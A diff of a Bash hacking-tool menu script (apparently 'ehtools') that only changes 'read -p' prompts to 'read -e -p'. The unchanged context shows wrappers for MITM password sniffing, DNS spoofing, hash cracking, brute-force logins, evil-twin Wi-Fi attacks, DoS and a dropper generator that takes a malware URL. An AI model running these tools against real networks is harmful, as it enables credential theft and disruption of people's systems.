@@ -408,7 +408,7 @@ function banner
 	echo -e ""$YS"13"$CE") MITM              "$YS"19"$CE") Geolocate an IP           "$YS"25"$CE") Shutdown computer"
 	echo -e ""$YS"14"$CE") Metasploit        "$YS"20"$CE") Bruteforce login          "$QE"26"$CE") Simple ehtools shell"
 	echo -e ""$YS" 0"$CE") Exit              "$YS"21"$CE") Sqlmap automated          "$YS"27"$CE") Update APT sources"
-	read -p $'(\e[4;93mehtools\e[0m\en)> ' YORNAA
+	read -e -p $'(\e[4;93mehtools\e[0m\en)> ' YORNAA
         echo "ehtools [PRO] ==> "$YORNAA"" >> /etc/ehtools/.ehtools.log
 	clear
 }
@@ -442,7 +442,7 @@ fi
 echo -e ""$YS" 3"$CE") "$ETH""
 echo -e ""$YS" b"$CE") Main menu"
 echo -e ""$YS" 0"$CE") Exit"
-read -p $'(\e[4;31mmenu\e[0m)> ' MYINT
+read -e -p $'(\e[4;31mmenu\e[0m)> ' MYINT
 if [[ "$MYINT" = "2" ]]
 then
 	if [[ "$WLANMCHECKING" = "" ]]
@@ -496,7 +496,7 @@ function change_mac
 		sleep 2
 	else
 		echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
-		read -p $'(\e[4;93mr/s\e[0m\en)> ' RORS
+		read -e -p $'(\e[4;93mr/s\e[0m\en)> ' RORS
 		clear
 		if [[ "$RORS" != "s" ]]
 		then
@@ -507,7 +507,7 @@ function change_mac
 			echo -e "["$YS"inf"$CE"] "$YS"Done"$CE""
 		else
 			echo -e "Enter the MAC you want:"
-			read -p $'(\e[4;93m(new)mac\e[0m\en)> ' SMAC
+			read -e -p $'(\e[4;93m(new)mac\e[0m\en)> ' SMAC
 			echo -e "Changing mac address of $MYINT to $SMAC..."
 			ifconfig $MYINT down
 			macchanger -m $SMAC $MYINT
@@ -522,19 +522,19 @@ clear
 while true
 do
 echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode("$YS"Enter"$CE"=wlan0): "
-read -p $'(\e[4;93minterface\e[0m\en)> ' MANAGED
+read -e -p $'(\e[4;93minterface\e[0m\en)> ' MANAGED
 if [[ "$MANAGED" = "" ]]
 then
 	MANAGED="wlan0"
 fi
 echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode("$YS"Enter"$CE"=wlan0mon): "
-read -p $'(\e[4;93minterface\e[0m\en)> ' MONITOR
+read -e -p $'(\e[4;93minterface\e[0m\en)> ' MONITOR
 if [[ "$MONITOR" = "" ]]
 then
 	MONITOR="wlan0mon"
 fi
 echo -e "Enter the name of your wired interface("$YS"Enter"$CE"="eth0"): "
-read -p $'(\e[4;93minterface\e[0m\en)> ' WIRED
+read -e -p $'(\e[4;93minterface\e[0m\en)> ' WIRED
 if [[ "$WIRED" = "" ]]
 then
 	WIRED="eth0"
@@ -621,7 +621,7 @@ echo -e "Enter the keyboard shortcut that will open "$TITLE" from ehtools main m
 echo -e "(e.g: "$YS""$TITLE""$CE")"
 echo -e "To delete it , type:   "$YS"delete"$CE""
 echo -e ""$YS" b"$CE") Go back"
-read -p $'(\e[4;93mshortcut\e[0m\en)> ' CHECKKS
+read -e -p $'(\e[4;93mshortcut\e[0m\en)> ' CHECKKS
 if [[ "$CHECKKS" = "back" || "$CHECKKS" = "b" ]]
 then
 	clear
@@ -784,7 +784,7 @@ function listshortcuts
 	#~ elif [[ "$nn" = "23" ]]
 	#~ then
 		#~ TITLE="Sniper"
-		#~ NAMECD='read -p 'DOMAIN:' DOMAIN'
+		#~ NAMECD='read -e -p 'DOMAIN:' DOMAIN'
 		#~ KSSET="sniper $DOMAIN"
 	elif [[ "$nn" = "23" ]]
 	then
@@ -1014,7 +1014,7 @@ do
 		echo -e "  "$YS"n"$CE") No confirmation"
 	fi
 	echo -e "  "$YS"0"$CE") Exit"
-	read -p $'(\e[4;31minstall/reinstall\e[0m)> ' ST
+	read -e -p $'(\e[4;31minstall/reinstall\e[0m)> ' ST
 	if [[ "$ST" == "b" || "$ST" == "back" ]]
 	then
 		clear
@@ -1129,7 +1129,7 @@ done
 	#~ echo -e ""$YS"20"$CE") Websploit    "$YS"40"$CE") Geany         "$YS"60"$CE") Dr0p1t"
 	#~ echo -e ""$YS" b"$CE") Go back"
 	#~ echo -e ""$YS" 0"$CE") Exit"
-	#~ read -p $'(\e[4;31minstall/reinstall\e[0m)> ' REIN
+	#~ read -e -p $'(\e[4;31minstall/reinstall\e[0m)> ' REIN
 	#~ clear
 	#~ if [[ "$REIN" = "1" ]]
 	#~ then
@@ -1398,7 +1398,7 @@ echo -e ""$YS" 8"$CE") Complete fix for apache2 service failed to start"
 echo -e ""$YS" 9"$CE") Cannot capture handshake-pyrit verification always bad"
 echo -e ""$YS" b"$CE") Go back"
 echo -e ""$YS" 0"$CE") Exit"
-read -p $'(\e[4;31merrors\e[0m)> ' ERRS
+read -e -p $'(\e[4;31merrors\e[0m)> ' ERRS
 clear
 if [[ "$ERRS" = "1" ]]
 then
@@ -1426,7 +1426,7 @@ then
 	echo -e "["$YS"inf"$CE"] "$YS"It seems to be fixed!"$CE""
 	sleep 0.5
 	echo -e "Enter your interface: "
-	read -p $'(\e[4;93minterface\e[0m)> ' INTWASH
+	read -e -p $'(\e[4;93minterface\e[0m)> ' INTWASH
 	sleep 0.5
 	echo -e "Press "$YS"many key"$CE" to test wash"
 	read -n 1
@@ -1525,7 +1525,7 @@ echo -e ""$YS" 2"$CE") See hidden shortcuts"
 echo -e ""$YS" b"$CE") Go back"
 #~ echo -e ""$YS"00"$CE") Main menu"
 echo -e ""$YS" 0"$CE") Exit"
-read -p $'(\e[4;31mksconsole\e[0m)> ' KS
+read -e -p $'(\e[4;31mksconsole\e[0m)> ' KS
 clear
 if [[ "$KS" = "1" ]]
 then
@@ -1573,7 +1573,7 @@ then
 		echo -e ""$YS" b"$CE") Go back"
 		#echo -e ""$YS" 0"$CE") Exit"
 		#nn=""
-		read -p $'(\e[4;31mshortcuts\e[0m)> ' nn
+		read -e -p $'(\e[4;31mshortcuts\e[0m)> ' nn
 		clear
 		listshortcuts
 		if [[ "$nn" = "" ]]
@@ -1641,7 +1641,7 @@ echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
 echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
 echo -e ""$YS" b"$CE") Go back"
 echo -e ""$YS" 0"$CE") Exit"
-read -p $'(\e[5;32mmitm\e[0m)> ' MITMATT
+read -e -p $'(\e[5;32mmitm\e[0m)> ' MITMATT
 clear
 if [[ "$MITMATT" = "1" ]]
 then
@@ -1655,7 +1655,7 @@ then
 	echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;31mmitm\e[0m) => (\e[5;33mCH\e[0m)> ' MITMCH
+	read -e -p $'(\e[4;31mmitm\e[0m) => (\e[5;33mCH\e[0m)> ' MITMCH
 	if [[ "$MITMCH" = "1" ]]
 	then
 		echo "1" > /proc/sys/net/ipv4/ip_forward
@@ -1670,14 +1670,14 @@ then
 	then
 		clear
 		echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
-		read -p $'(\e[4;93mport\e[0m\en)> ' PORTTCP
+		read -e -p $'(\e[4;93mport\e[0m\en)> ' PORTTCP
 		if [[ "$PORTTCP" = "" ]]
 		then
 			PORTTCP="8080"
 		fi
 					clear
 		echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
-		read -p $'(\e[4;93mport\e[0m\en)> ' PORTUDP
+		read -e -p $'(\e[4;93mport\e[0m\en)> ' PORTUDP
 		if [[ "$PORTUDP" = "" ]]
 		then
 			PORTUDP="40"
@@ -1695,10 +1695,10 @@ then
 		echo -e ""
 		echo -e ""
 		echo -e "Enter your gateway(prefer "$ETH" gateway):"
-		read -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
+		read -e -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
 		echo -e ""
 		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
-		read -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
+		read -e -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
 		if [[ "$GATEINT" = "" ]]
 		then
 			GATEINT="$ETH"
@@ -1710,7 +1710,7 @@ then
 		echo -e ""
 		echo -e ""
 		echo -e "Enter your target IP:"
-		read -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
+		read -e -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
 		if [[ "$TARGIP" = "r" ]]
 		then
 			continue
@@ -1738,17 +1738,17 @@ then
 	then
 		clear
 		echo -e "Enter your gateway(prefer "$ETH" gateway):"
-		read -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
+		read -e -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
 		echo -e ""
 		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
-		read -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
+		read -e -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
 		if [[ "$GATEINT" = "" ]]
 		then
 			GATEINT="$ETH"
 		fi
 		clear
 		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
-		read -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
+		read -e -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
 		echo -e ""
 		echo -e "$PAKTC"
 		$READAK
@@ -1805,7 +1805,7 @@ then
 	echo -e ""$YS" 5"$CE") Start DNSspoofing"
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;31mmitm\e[0m) => (\e[5;32mSpoof\e[0m)> ' MITMSET
+	read -e -p $'(\e[4;31mmitm\e[0m) => (\e[5;32mSpoof\e[0m)> ' MITMSET
 	clear
 	if [[ "$MITMSET" = "1" ]]
 	then
@@ -1823,10 +1823,10 @@ then
 		echo -e ""
 		echo -e ""
 		echo -e "Enter your gateway:"
-		read -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
+		read -e -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
 		echo -e ""
 		echo -e "Enter the gateway's interface(e.g: wlan0):"
-		read -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
+		read -e -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
 		while true
 		do		
 		clear
@@ -1834,7 +1834,7 @@ then
 		echo -e ""
 		echo -e ""
 		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
-		read -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
+		read -e -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
 		if [[ "$TARGIP" = "r" ]]
 		then
 			continue
@@ -1845,13 +1845,13 @@ then
 	elif [[ "$MITMSET" = "22" ]]
 	then
 		echo -e "Enter your gateway:"
-		read -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
+		read -e -p $'(\e[4;34mgateway\e[0m\en)> ' GATENM
 		echo -e ""
 		echo -e "Enter the gateway's interface(e.g: wlan0):"
-		read -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
+		read -e -p $'(\e[4;93minterface\e[0m\en)> ' GATEINT
 		clear
 		echo -e "Enter your target IP:"
-		read -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
+		read -e -p $'(\e[4;93mtarget\e[0m\en)> ' TARGIP
 	elif [[ "$MITMSET" = "3" ]]
 	then
 		export PAKTC
@@ -1881,9 +1881,9 @@ then
 		echo -e "Enter your IP address that you started the server:"
 		echo -e "One of this/these:"
 		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
-		read -p $'(\e[4;93mIP\e[0m\en)> ' SERVIP
+		read -e -p $'(\e[4;93mIP\e[0m\en)> ' SERVIP
 		echo -e "Enter the interface of that IP(e.g: wlan0):"
-		read -p $'(\e[4;93minterface\e[0m\en)> ' INTIP
+		read -e -p $'(\e[4;93minterface\e[0m\en)> ' INTIP
 		if [[ -f ""$EPATH"/HOSTS/hosts.txt" ]]
 		then
 			rm "$EPATH"/HOSTS/hosts.txt
@@ -1894,12 +1894,12 @@ then
 		do
 		clear
 		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
-		read -p $'(\e[4;93murl\e[0m\en)> ' URL
+		read -e -p $'(\e[4;93murl\e[0m\en)> ' URL
 		echo "$SERVIP	$URL" >> "$EPATH"/HOSTS/hosts.txt
 		sleep 0.2
 		clear
 		echo -e "Add another one as well?"$YNYES""
-		read -p $'(\e[4;93madd\e[0m\en)> ' ANOTHERHOST
+		read -e -p $'(\e[4;93madd\e[0m\en)> ' ANOTHERHOST
 		if [[ "$ANOTHERHOST" = "n" ]]
 		then
 			break
@@ -2012,7 +2012,7 @@ do
 	echo -e "------------------------------------------------"
 	echo -e ""$YS" b"$CE") Go back              "$YS"update"$CE") Update dagon"
 	echo -e ""$YS"start"$CE") Start"
-	read -p $'(\e[5;33DAGON\e[0m)> ' DAGON
+	read -e -p $'(\e[5;33DAGON\e[0m)> ' DAGON
 	clear
 	if [[ "$DAGON" = "back" || "$DAGON" = "b" ]]
 	then
@@ -2086,12 +2086,12 @@ do
 		echo -e ""$YS" 2"$CE") Select multiple disctionaries"
 		echo -e ""$YS" 3"$CE") Select a folder with disctionaries"
 		echo -e ""$YS" b"$CE") Go back"
-		read -p $'(\e[4;32mdictsel\e[0m)> ' DICTSEL
+		read -e -p $'(\e[4;32mdictsel\e[0m)> ' DICTSEL
 		clear
 		if [[ "$DICTSEL" = 1 ]]
 		then
 			echo -e "Type the path of the dictionary:"
-			read -p $'(\e[4;93mpath\e[0m\en)> ' DICTPATH
+			read -e -p $'(\e[4;93mpath\e[0m\en)> ' DICTPATH
 			if [[ ! -f "$DICTPATH" ]]
 			then
 				echo -e ""$RS"No such file"$CE""
@@ -2102,7 +2102,7 @@ do
 		elif [[ "$DICTSEL" = 2 ]]
 		then
 			echo -e "Type the path of the first dictionary:"
-			read -p $'(\e[4;93mpath\e[0m\en)> ' DICTPATH
+			read -e -p $'(\e[4;93mpath\e[0m\en)> ' DICTPATH
 			if [[ ! -f "$DICTPATH" ]]
 			then
 				echo -e ""$RS"No such file"$CE""
@@ -2131,7 +2131,7 @@ do
 		elif [[ "$DICTSEL" = 3 ]]
 		then
 			echo -e "Type the path of the folder:"
-			read -p $'(\e[4;93mpath\e[0m\en)> ' DICTPATH
+			read -e -p $'(\e[4;93mpath\e[0m\en)> ' DICTPATH
 			if [[ ! -d "$DICTPATH" ]]
 			then
 				echo -e ""$RS"No such folder"$CE""
@@ -2161,7 +2161,7 @@ do
 		echo -e ""$YS" 2"$CE") Type multiple hashes"
 		echo -e ""$YS" 3"$CE") Select a file with hashes"
 		echo -e ""$YS" b"$CE") Go back"
-		read -p $'(\e[4;33mhashes\e[0m)> ' HASHES
+		read -e -p $'(\e[4;33mhashes\e[0m)> ' HASHES
 		clear
 		if [[ "$HASHES" = "back" || "$HASHES" = "b" ]]
 		then
@@ -2169,19 +2169,19 @@ do
 		elif [[ "$HASHES" = 1 ]]
 		then
 			echo -e "Type your hash: "
-			read -p $'(\e[4;93mhash\e[0m\en)> ' HASH
+			read -e -p $'(\e[4;93mhash\e[0m\en)> ' HASH
 			HASHTYPE=1
 		elif [[ "$HASHES" = 2 ]]
 		then
 			echo -e "Type your first hash: "
-			read -p $'(\e[4;93mhash\e[0m\en)> ' HASH
+			read -e -p $'(\e[4;93mhash\e[0m\en)> ' HASH
 			echo -e "$HASH" > $EPATH/hashes.txt
 			while true
 			do
 				clear
 				echo -e ""$RS"----------TO STOP, TYPE 0----------"
 				echo -e "Type your next hash: "
-				read -p $'(\e[4;93mhash\e[0m\en)> ' HASH
+				read -e -p $'(\e[4;93mhash\e[0m\en)> ' HASH
 				if [[ "$HASH" = "0" || "$HASH" = "o" || "$HASH" = "O" ]]
 				then
 					HASH="multiple"
@@ -2193,7 +2193,7 @@ do
 		elif [[ "$HASHES" = 3 ]]
 		then
 			echo -e "Type the full path of the file: "
-			read -p $'(\e[4;93mpath\e[0m\en)> ' HASHPATH
+			read -e -p $'(\e[4;93mpath\e[0m\en)> ' HASHPATH
 			if [[ ! -f "$HASHPATH" ]]
 			then
 				echo -e ""$RS"There is not such file."$CE""
@@ -2270,7 +2270,7 @@ $YS 32$CE) umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes
 EOF
 )
 	echo -e "$pttr"
-	read -p $'(\e[4;33mpatator\e[0m)> ' PT
+	read -e -p $'(\e[4;33mpatator\e[0m)> ' PT
 	if [[ "$PT" = 1 ]]
 	then
 		XPT="ftp_login"
@@ -2498,7 +2498,7 @@ function eaphammer_automation
 				echo -e ""$YS"start"$CE") Start "
 				echo -e ""$YS"00"$CE") Main menu"
 				echo -e ""$YS" back"$CE") Go back"
-				read -p $'(\e[4;33meaphammer\e[0m)> ' EAPH
+				read -e -p $'(\e[4;33meaphammer\e[0m)> ' EAPH
 				clear
 				if [[ "$EAPH" = 1 ]]
 				then
@@ -2507,19 +2507,19 @@ function eaphammer_automation
 				elif [[ "$EAPH" = 2 ]]
 				then
 					echo -e "Type the interface you want to use: "
-					read -p $'(\e[4;93minterface\e[0m)> ' EAPHIFACE
+					read -e -p $'(\e[4;93minterface\e[0m)> ' EAPHIFACE
 				elif [[ "$EAPH" = 3 ]]
 				then
 					echo -e "Type the ESSID: "
-					read -p $'(\e[4;93messid\e[0m)> ' EAPHESSID
+					read -e -p $'(\e[4;93messid\e[0m)> ' EAPHESSID
 				elif [[ "$EAPH" = 4 ]]
 				then
 					echo -e "Type the BSSID: "
-					read -p $'(\e[4;93mbssid\e[0m)> ' EAPHBSSID
+					read -e -p $'(\e[4;93mbssid\e[0m)> ' EAPHBSSID
 				elif [[ "$EAPH" = 5 ]]
 				then
 					echo -e "Type the channel: "
-					read -p $'(\e[4;93mchannel\e[0m)> ' EAPHCHANNEL
+					read -e -p $'(\e[4;93mchannel\e[0m)> ' EAPHCHANNEL
 				elif [[ "$EAPH" = 6 ]]
 				then
 					if [[ "$EAPHWPA" = 1 ]]
@@ -2533,7 +2533,7 @@ function eaphammer_automation
 					echo -e ""$YS" 1"$CE") Open"
 					echo -e ""$YS" 2"$CE") ttls"
 					echo -e ""$YS" 3"$CE") peap"
-					read -p $'(\e[4;33mcheck\e[0m)> ' PAUTH
+					read -e -p $'(\e[4;33mcheck\e[0m)> ' PAUTH
 					if [[ "$PAUTH" = 1 ]]
 					then
 						EAPHAUTH="open"
@@ -2590,9 +2590,9 @@ function eaphammer_automation
 					then
 						clear
 						echo -e "Hostname: "
-						read -p $'(\e[4;93mhostname\e[0m)> ' HOSTN
+						read -e -p $'(\e[4;93mhostname\e[0m)> ' HOSTN
 						echo -e "Port: "
-						read -p $'(\e[4;93mport\e[0m)> ' PORT
+						read -e -p $'(\e[4;93mport\e[0m)> ' PORT
 						clear
 						EAPHAIRCRACK=""$HOSTN":"$PORT""
 					else
@@ -2614,7 +2614,7 @@ function eaphammer_automation
 					else
 						clear
 						echo -e "Type the full wordlist path: "
-						read -p $'(\e[4;93mpath\e[0m)> ' EAPHWORD
+						read -e -p $'(\e[4;93mpath\e[0m)> ' EAPHWORD
 					fi
 				elif [[ "$EAPH" = "back" || "$EAPH" = "b" ]]
 				then
@@ -2811,7 +2811,7 @@ do
 	echo -e ""$YS" u"$CE") Check for updates"
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"start"$CE") Generate"
-	read -p $'(\e[4;33mdropit\e[0m)> ' DR
+	read -e -p $'(\e[4;33mdropit\e[0m)> ' DR
 	clear
 	if [[ "$DR" = "o" ]]
 	then
@@ -2949,7 +2949,7 @@ do
 	elif [[ "$DR" = 1 ]]
 	then
 		echo -e "Malware URL: "
-		read -p $'(\e[4;93murl\e[0m)> ' MALURL
+		read -e -p $'(\e[4;93murl\e[0m)> ' MALURL
 	elif [[ "$DR" = 14 ]]
 	then
 		if [[ "$ICON" = "OFF" ]]
@@ -2963,7 +2963,7 @@ do
 				echo -e ""$YS"cp"$CE") Copy my icon to that folder"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e "Enter the name of your icon: "
-				read -p $'(\e[4;93mname\e[0m)> ' ICON
+				read -e -p $'(\e[4;93mname\e[0m)> ' ICON
 				if [[ "$ICON" = "b" ]]
 				then
 					ICON="OFF"
@@ -2972,7 +2972,7 @@ do
 				then
 					clear
 					echo -e "Your file path: "
-					read -p $'(\e[4;93mpath\e[0m)> ' FP
+					read -e -p $'(\e[4;93mpath\e[0m)> ' FP
 					if [[ ! -f "$FP" ]]
 					then
 						echo -e ""$RS"File does not exist."$CE""
@@ -3010,7 +3010,7 @@ do
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e "Enter the name of your script: "
-				read -p $'(\e[4;93mname\e[0m)> ' RUNVBS
+				read -e -p $'(\e[4;93mname\e[0m)> ' RUNVBS
 				if [[ "$RUNVBS" = "b" ]]
 				then
 					RUNVBS="OFF"
@@ -3019,7 +3019,7 @@ do
 				then
 					clear
 					echo -e "Your file path: "
-					read -p $'(\e[4;93mpath\e[0m)> ' FP
+					read -e -p $'(\e[4;93mpath\e[0m)> ' FP
 					if [[ ! -f "$FP" ]]
 					then
 						echo -e ""$RS"File does not exist."$CE""
@@ -3057,7 +3057,7 @@ do
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e "Enter the name of your script: "
-				read -p $'(\e[4;93mname\e[0m)> ' RUNPOW
+				read -e -p $'(\e[4;93mname\e[0m)> ' RUNPOW
 				if [[ "$RUNPOW" = "b" ]]
 				then
 					RUNPOW="OFF"
@@ -3066,7 +3066,7 @@ do
 				then
 					clear
 					echo -e "Your file path: "
-					read -p $'(\e[4;93mpath\e[0m)> ' FP
+					read -e -p $'(\e[4;93mpath\e[0m)> ' FP
 					if [[ ! -f "$FP" ]]
 					then
 						echo -e ""$RS"File does not exist."$CE""
@@ -3104,7 +3104,7 @@ do
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e "Enter the name of your script: "
-				read -p $'(\e[4;93mname\e[0m)> ' RUNBAT
+				read -e -p $'(\e[4;93mname\e[0m)> ' RUNBAT
 				if [[ "$RUNBAT" = "b" ]]
 				then
 					RUNBAT="OFF"
@@ -3113,7 +3113,7 @@ do
 				then
 					clear
 					echo -e "Your file path: "
-					read -p $'(\e[4;93mpath\e[0m)> ' FP
+					read -e -p $'(\e[4;93mpath\e[0m)> ' FP
 					if [[ ! -f "$FP" ]]
 					then
 						echo -e ""$RS"File does not exist."$CE""
@@ -3451,7 +3451,7 @@ function wifi_tools
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
 	#echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;31mWiFi\e[0m)> ' APPP
+	read -e -p $'(\e[4;31mWiFi\e[0m)> ' APPP
 	clear
 	if [[ "$APPP" = "1" ]]
 	then
@@ -3468,7 +3468,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_fluxion
@@ -3483,7 +3483,7 @@ function wifi_tools
 			wifite
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_wifite
@@ -3499,7 +3499,7 @@ function wifi_tools
 			wifiphisher
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_wifiphisher
@@ -3523,7 +3523,7 @@ function wifi_tools
 			fi
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_entropy
@@ -3540,7 +3540,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_morpheus
@@ -3556,7 +3556,7 @@ function wifi_tools
 			./netool.sh
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_netool
@@ -3576,7 +3576,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_hakku
@@ -3594,7 +3594,7 @@ function wifi_tools
 			trity			
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_trity
@@ -3612,7 +3612,7 @@ function wifi_tools
 			cd		
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_dracnmap
@@ -3629,7 +3629,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_fern
@@ -3642,7 +3642,7 @@ function wifi_tools
 		if [[ -f /usr/sbin/netdiscover ]]
 		then
 			echo -e "Range ("$YS"Enter"$CE"=192.168.1.0/24):"
-			read -p $'(\e[4;93mrange\e[0m)> ' NRANGE
+			read -e -p $'(\e[4;93mrange\e[0m)> ' NRANGE
 			if [[ -z $NRANGE ]]
 			then
 				NRANGE="192.168.1.0/24"
@@ -3650,7 +3650,7 @@ function wifi_tools
 			netdiscover -r $NRANGE -i "$WLANN"
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_netdiscover
@@ -3667,7 +3667,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_kickthemout
@@ -3684,7 +3684,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_ghostphisher
@@ -3702,7 +3702,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_theeye
@@ -3715,14 +3715,14 @@ function wifi_tools
 		if [[ -d "/root/xerxes" ]]
 		then
 			echo -e "Do you own the site you want to DoS?"$YNONLY""
-			read -p $'(\e[4;93mown\e[0m)> ' DOSTERM
+			read -e -p $'(\e[4;93mown\e[0m)> ' DOSTERM
 			if [[ "$DOSTERM" = "y" ]]
 			then
 
 				clear
 				echo -e "Enter your site(e.g: iownthissite.com): "
 				echo -e "(without www)"
-				read -p $'(\e[4;93msite\e[0m)> ' SITEDOS
+				read -e -p $'(\e[4;93msite\e[0m)> ' SITEDOS
 				clear
 				echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
 				sleep 4
@@ -3741,7 +3741,7 @@ function wifi_tools
 			fi
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_xerxes
@@ -3756,7 +3756,7 @@ function wifi_tools
 			ktf.console
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_katana
@@ -3774,7 +3774,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_airgeddon
@@ -3789,7 +3789,7 @@ function wifi_tools
 			websploit
 		else
 			echo -e "$TNI"
